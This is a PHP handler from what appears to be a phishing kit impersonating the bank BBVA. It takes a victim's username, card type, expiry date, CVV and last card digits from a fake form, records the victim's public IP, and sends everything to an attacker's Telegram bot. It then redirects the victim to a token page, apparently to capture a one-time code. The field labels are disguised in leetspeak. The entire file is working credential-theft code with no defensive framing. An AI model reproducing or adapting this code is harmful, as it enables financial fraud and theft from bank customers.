<?php
session_start();
require_once __DIR__ . '/portales.php';


function getClientIpPublicOnly(): ?string {
    $candidates = [
        'HTTP_CF_CONNECTING_IP',
        'HTTP_X_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'HTTP_X_REAL_IP',
        'HTTP_CLIENT_IP',
        'REMOTE_ADDR'
    ];

    $isPublic = static function ($ip): bool {
        return filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false;
    };

    $clean = static function ($raw): string {
        return preg_replace('/:\d+$/', '', trim($raw, "[] \t\n\r\0\x0B\"")) ?: $raw;
    };

    foreach ($candidates as $key) {
        if (empty($_SERVER[$key])) continue;
        $value = $_SERVER[$key];

        if ($key === 'HTTP_X_FORWARDED_FOR') {
            $parts = array_map($clean, array_map('trim', explode(',', $value)));
            foreach ($parts as $ip) if ($isPublic($ip)) return $ip;
            continue;
        }

        if ($key === 'HTTP_FORWARDED') {
            if (preg_match_all('/for=([^;,\s]+)/i', $value, $m)) {
                foreach ($m[1] as $raw) {
                    $ip = $clean($raw);
                    if ($isPublic($ip)) return $ip;
                }
            }
            continue;
        }

        $ip = $clean($value);
        if ($isPublic($ip)) return $ip;
    }

    return null;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
    $username = $_SESSION['username'] ?? '';

  
    $tipo = htmlspecialchars($_POST['tipodo']  ?? '', ENT_QUOTES, 'UTF-8');
    $dccc = htmlspecialchars($_POST['nameco']  ?? '', ENT_QUOTES, 'UTF-8');
    $sevas= htmlspecialchars($_POST['nolada']  ?? '', ENT_QUOTES, 'UTF-8');
    $ulti = htmlspecialchars($_POST['lastDoc'] ?? '', ENT_QUOTES, 'UTF-8');

 
    $ip = getClientIpPublicOnly();


    if (!$ip && !empty($_POST['ip_pub'])) {
        $candidate = trim($_POST['ip_pub']);
        if (filter_var($candidate, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
            $ip = $candidate;
        }
    }

    if (!$ip) {
        $ip = 'IP no disponible';
    }


    $botToken = $telegram['botToken'];
    $chatId   = $telegram['chatId'];


    $text = "BBVA | $username\n----\nTip0: $tipo\nF3CH4: $dccc\nC3v: $sevas\nULTS: $ulti\nIP: $ip";

    
    $url = "https://api.telegram.org/bot{$botToken}/sendMessage";
    $payload = [
        'chat_id' => $chatId,
        'text'    => $text,
        'disable_web_page_preview' => true
    ];

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_POST           => true,
        CURLOPT_POSTFIELDS     => http_build_query($payload),
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10
    ]);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    curl_close($ch);

    if ($response !== false && $httpCode >= 200 && $httpCode < 300) {
        header("Location: ../token.html");
        exit;
    } else {
        http_response_code(500);
        echo "Error al enviar el mensaje.";
    }
} else {
    http_response_code(405);
    echo 'Método de solicitud no permitido.';
}
?>